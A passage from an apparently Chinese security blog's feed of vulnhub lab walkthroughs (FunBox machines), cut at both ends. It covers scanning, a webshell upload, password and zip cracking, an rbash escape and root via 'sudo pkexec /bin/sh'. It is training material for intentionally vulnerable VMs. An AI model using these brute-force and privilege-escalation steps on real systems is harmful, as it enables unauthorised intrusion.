aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428210320497.png" alt="image-20240428210320497"></p><p>发现是一个登录页面，可以想到密码爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.10/secert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428210405747.png" alt="image-20240428210405747"></p><p>没有任何有用的信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.10/store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428210451780.png" alt="image-20240428210451780"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.10/store/admin.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429211738306.png" alt="image-20240429211738306"></p><p>还是一个登录页面</p><h3 id="3-disearch目录扫描"><a href="#3-disearch目录扫描" class="headerlink" title="3)disearch目录扫描"></a>3)disearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.2.10 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428211132889.png" alt="image-20240428211132889"></p><p>多了一个robots.txt，我们进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.2.10/robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428211311090.png" alt="image-20240428211311090"></p><p>192.168.2.10&#x2F;gym</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428211353997.png" alt="image-20240428211353997"></p><p>还是没有用，我们可以试试dirb目录扫描，试试看能不能扫描出来有用的信息</p><h3 id="4-dirb目录扫描"><a href="#4-dirb目录扫描" class="headerlink" title="4)dirb目录扫描"></a>4)dirb目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240428213629387.png" alt="image-20240428213629387"></p><p>我们可以看到扫描出来一个数据库，我们进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.10/store/database<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429210423489.png" alt="image-20240429210423489"></p><p>访问到2个敏感信息，我们进行访问</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429210535214.png" alt="image-20240429210535214"></p><p>没有什么用，我们访问第二个</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429210637492.png" alt="image-20240429210637492"></p><p>我们发现了一个用户名和一个md5加密的密码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429210857604.png" alt="image-20240429210857604"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">用户名和密码都是admin，我们进行登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-登录"><a href="#1-登录" class="headerlink" title="1)登录"></a>1)登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.10/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429211635153.png" alt="image-20240429211635153"></p><p>我们发现登录不了,那么我们试试另一个登录页面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.10/store/admin.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429212017304.png" alt="image-20240429212017304"></p><p>我们发现登录成功，我们寻找漏洞</p><h3 id="2-文件上传漏洞"><a href="#2-文件上传漏洞" class="headerlink" title="2)文件上传漏洞"></a>2)文件上传漏洞</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429212048307.png" alt="image-20240429212048307"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429212659349.png" alt="image-20240429212659349"></p><p>我们上传一句话木马,可以看到上传成功，我们进行反弹shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429212542731.png" alt="image-20240429212542731"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429212752014.png" alt="image-20240429212752014"></p><h3 id="3-查看目录"><a href="#3-查看目录" class="headerlink" title="3)查看目录"></a>3)查看目录</h3><p>我们在&#x2F;home&#x2F;目录下发现了tony,我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429214718631.png" alt="image-20240429214718631"></p><p>我们可以看到ssh登录的密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429214857388.png" alt="image-20240429214857388"></p><h3 id="4-ssh登录"><a href="#4-ssh登录" class="headerlink" title="4)ssh登录"></a>4)ssh登录</h3><p>既然我们知道了ssh登录的密码，那么我们进行登录即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429215023910.png" alt="image-20240429215023910"></p><p>我们可以看到登录成功，我们查看权限是tony,那么我们进行提权</p><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h3><p>我们使用sudo -l查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429215138385.png" alt="image-20240429215138385"></p><p>我们发现了pkexec，我们进行提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pkexec是一个SUID-root程序，默认安装在每个主要的Linux发行版上。这个容易被利用的漏洞允许任何没有相关权限的用户通过利用默认配置中的这个漏洞获得脆弱主机上的完全根权限Polkit<span class="token punctuation">(</span>以前是PolicyKit<span class="token punctuation">)</span>是一个用于控制类unix操作系统中的系统权限的组件。它为非权限进程提供了一种有组织的方式来与权限进程进行通信。还可以使用polkit来执行具有更高权限的命令，使用命令pkexec，后面跟着要执行的命令<span class="token punctuation">(</span>具有根权限<span class="token punctuation">)</span>。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pkexec /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240429215636069.png" alt="image-20240429215636069"></p><p>此靶场比较简单,都是基础的知识,没有什么难度。</p><p>至此获取到了所有得flag，渗透测试结束。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>FunBox-2</title>
    <link href="http://ms02423.top/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-2/"/>
    <id>http://ms02423.top/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-2/</id>
    <published>2024-03-31T11:57:39.000Z</published>
    <updated>2024-03-31T13:49:41.708Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Boot2Root ! This can be a <span class="token keyword">real</span> life scenario <span class="token keyword">if</span> rockies becomes admins<span class="token punctuation">.</span> Easy going <span class="token keyword">in</span> round about <span class="token number">15</span> mins<span class="token punctuation">.</span> <span class="token keyword">Bit</span> more<span class="token punctuation">,</span> <span class="token keyword">if</span> you <span class="token keyword">are</span> find <span class="token operator">and</span> stuck <span class="token keyword">in</span> the rabbit-hole <span class="token keyword">first</span><span class="token punctuation">.</span>This VM <span class="token keyword">is</span> created<span class="token operator">/</span>tested <span class="token keyword">with</span> Virtualbox<span class="token punctuation">.</span> Maybe it works <span class="token keyword">with</span> vmware<span class="token punctuation">.</span><span class="token keyword">If</span> you need hints<span class="token punctuation">,</span> <span class="token keyword">call</span> me <span class="token keyword">on</span> twitter<span class="token punctuation">:</span> @0815R2d2Have fun<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span class="token punctuation">.</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/funbox-rookie,520/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331201823410.png" alt="image-20240331201823410"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：<span class="token number">192.168</span><span class="token number">.2</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip地址"><a href="#1-寻找靶场真实ip地址" class="headerlink" title="1.寻找靶场真实ip地址"></a>1.寻找靶场真实ip地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331202050382.png" alt="image-20240331202050382"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331202248660.png" alt="image-20240331202248660"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">我们通过上面<span class="token number">2</span>个命令，知道靶场真实ip地址为<span class="token number">192.168</span><span class="token number">.2</span><span class="token number">.4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331204558658.png" alt="image-20240331204558658"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">21</span>端口<span class="token punctuation">,</span>服务为ProFTPD <span class="token number">1.3</span><span class="token punctuation">.</span>5e发现开启了<span class="token number">22</span>端口<span class="token punctuation">,</span>服务为OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>6p1 Ubuntu 4ubuntu0<span class="token punctuation">.</span><span class="token number">3</span> <span class="token punctuation">(</span>Ubuntu Linux; protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">80</span>端口<span class="token punctuation">,</span>服务为Apache httpd <span class="token number">2.4</span><span class="token number">.29</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331204946404.png" alt="image-20240331204946404"></p><p>是一个apache2服务页面</p><pre class="line-numbers language-none"><code class="language-none">ftp:&#x2F;&#x2F;192.168.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331205058446.png" alt="image-20240331205058446"></p><p>我们可以看到很多的压缩包文件</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331205259747.png" alt="image-20240331205259747"></p><p>没有有用的信息</p><h3 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331205532542.png" alt="image-20240331205532542"></p><p>扫描到一个有用的信息，是robots.txt</p><h3 id="3-disearch目录扫描"><a href="#3-disearch目录扫描" class="headerlink" title="3)disearch目录扫描"></a>3)disearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.2.4 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331205844474.png" alt="image-20240331205844474"></p><p>没有什么新的发现，最后有用的信息是一个robots.txt目录和ftp服务</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问robots-txt目录"><a href="#1-访问robots-txt目录" class="headerlink" title="1)访问robots.txt目录"></a>1)访问robots.txt目录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.4/robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331210003010.png" alt="image-20240331210003010"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.2.4/logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331210241431.png" alt="image-20240331210241431"></p><p>我们可以看到报错了，那么这个办法是行不通的，我们换一个思路，我们查看ftp访问</p><h3 id="2-访问ftp服务"><a href="#2-访问ftp服务" class="headerlink" title="2)访问ftp服务"></a>2)访问ftp服务</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331205058446.png" alt="image-20240331205058446"></p><p>我们看到好多的压缩包而且都是加密的，我们进行爆破</p><p>新建一个 MS02423文件夹把下载的压缩包文件都放进去发现里面都是加密的 id_rsa再把 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt字典 复制进去</p><h3 id="3-爆破密码"><a href="#3-爆破密码" class="headerlink" title="3)爆破密码"></a>3)爆破密码</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331211606581.png" alt="image-20240331211606581"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331212001840.png" alt="image-20240331212001840"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">这里破解出了两个用户的密码分别是<span class="token punctuation">:</span>catwoman 和 iubire<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-ssh私钥登录"><a href="#4-ssh私钥登录" class="headerlink" title="4)ssh私钥登录"></a>4)ssh私钥登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa tom@192.168.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们通过密码获取到tom的私钥，我们进行登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331212933593.png" alt="image-20240331212933593"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331213202615.png" alt="image-20240331213202615"></p><p>我们可以看到登录成功</p><p>登入后发现 是普通权限 这里被限制了 -rbsh需要绕过rbash</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331213402340.png" alt="image-20240331213402340"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa tom@192.168.2.4 <span class="token parameter variable">-t</span> <span class="token string">"bash --noprofile"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以看到成功绕过，我们查看home目录下的文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331213923435.png" alt="image-20240331213923435"></p><p>我们可以在tom文件夹里面看见一个.mysql_history文件，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331214049745.png" alt="image-20240331214049745"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">我们可以看到tom的密码是xx11yy22!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h3><p>我们知道tom的密码了，那么我们直接进行登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331214520307.png" alt="image-20240331214520307"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331214609385.png" alt="image-20240331214609385"></p><p>我们可以看到权限是root，我们直接查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240331214812168.png" alt="image-20240331214812168"></p><p>至此获取到了所有得flag，渗透测试结束。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>FunBox-1</title>
    <link href="http://ms02423.top/2024/03/28/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-1/"/>
    <id>http://ms02423.top/2024/03/28/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-1/</id>
    <published>2024-03-28T07:01:12.000Z</published>
    <updated>2024-03-28T08:50:46.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Boot2Root ! This <span class="token keyword">is</span> a reallife szenario<span class="token punctuation">,</span> but easy going<span class="token punctuation">.</span> You have <span class="token keyword">to</span>  enumerate <span class="token operator">and</span> understand the szenario <span class="token keyword">to</span> get the root-flag <span class="token keyword">in</span> round  about 20min<span class="token punctuation">.</span>This VM <span class="token keyword">is</span> created<span class="token operator">/</span>tested <span class="token keyword">with</span> Virtualbox<span class="token punctuation">.</span> Maybe it works <span class="token keyword">with</span> vmware<span class="token punctuation">.</span><span class="token keyword">If</span> you need hints<span class="token punctuation">,</span> <span class="token keyword">call</span> me <span class="token keyword">on</span> twitter<span class="token punctuation">:</span> @0815R2d2Have fun<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>funbox-1<span class="token punctuation">,</span><span class="token number">518</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328150739358.png" alt="image-20240328150739358"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.2.0&#x2F;24</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip地址"><a href="#1-寻找靶场真实ip地址" class="headerlink" title="1.寻找靶场真实ip地址"></a>1.寻找靶场真实ip地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328151344464.png" alt="image-20240328151344464"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328151522751.png" alt="image-20240328151522751"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场真实ip地址为<span class="token number">192.168</span><span class="token number">.2</span><span class="token number">.10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328151917950.png" alt="image-20240328151917950"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">21</span>端口<span class="token punctuation">,</span>服务为ProFTPD发现开启了<span class="token number">22</span>端口<span class="token punctuation">,</span>服务为OpenSSH <span class="token number">8</span><span class="token punctuation">.</span>2p1 Ubuntu 4ubuntu0<span class="token punctuation">.</span><span class="token number">11</span> <span class="token punctuation">(</span>Ubuntu Linux; protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">80</span><span class="token punctuation">,</span>服务为Apache httpd <span class="token number">2.4</span><span class="token number">.41</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span>发现开启了<span class="token number">33060</span><span class="token punctuation">,</span>服务为mysqlx?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.2</span><span class="token number">.10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328152350721.png" alt="image-20240328152350721"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328152447314.png" alt="image-20240328152447314"></p><p>我们可以想到是IP地址和域名没有进行绑定，我们进行绑定即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/hosts<span class="token number">192.168</span>.2.10   funbox.fritz.box<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328152706689.png" alt="image-20240328152706689"></p><p>我们再次进行访问，可以看到页面正常</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328152803352.png" alt="image-20240328152803352"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">ftp<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.2</span><span class="token number">.10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要进行验证</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328152922612.png" alt="image-20240328152922612"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328153130793.png" alt="image-20240328153130793">扫描到cms框架是wordpress，我们可以猜测是需要爆破用户名和密码</p><h3 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328153540575.png" alt="image-20240328153540575"></p><p>扫描到一个有用的信息，是wordpress的登录页面</p><h3 id="3-disearch目录扫描"><a href="#3-disearch目录扫描" class="headerlink" title="3)disearch目录扫描"></a>3)disearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.2.10 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328153821539.png" alt="image-20240328153821539"></p><p>没有什么新的发现，最后有用的信息只有一个登录页面</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-爆破用户名"><a href="#1-爆破用户名" class="headerlink" title="1)爆破用户名"></a>1)爆破用户名</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://funbox.fritz.box/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328154004623.png" alt="image-20240328154004623"></p><p>我们使用wpscan进行爆破用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://192.168.2.10 <span class="token parameter variable">-e</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328154310815.png" alt="image-20240328154310815"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">爆破出来<span class="token number">2</span>个用户名，一个是admin<span class="token punctuation">,</span>一个是joe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-爆破密码"><a href="#2-爆破密码" class="headerlink" title="2)爆破密码"></a>2)爆破密码</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://funbox.fritz.box/ <span class="token parameter variable">-U</span> user.txt <span class="token parameter variable">--passwords</span>  /usr/share/wordlists/rockyou.txt   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328155050450.png" 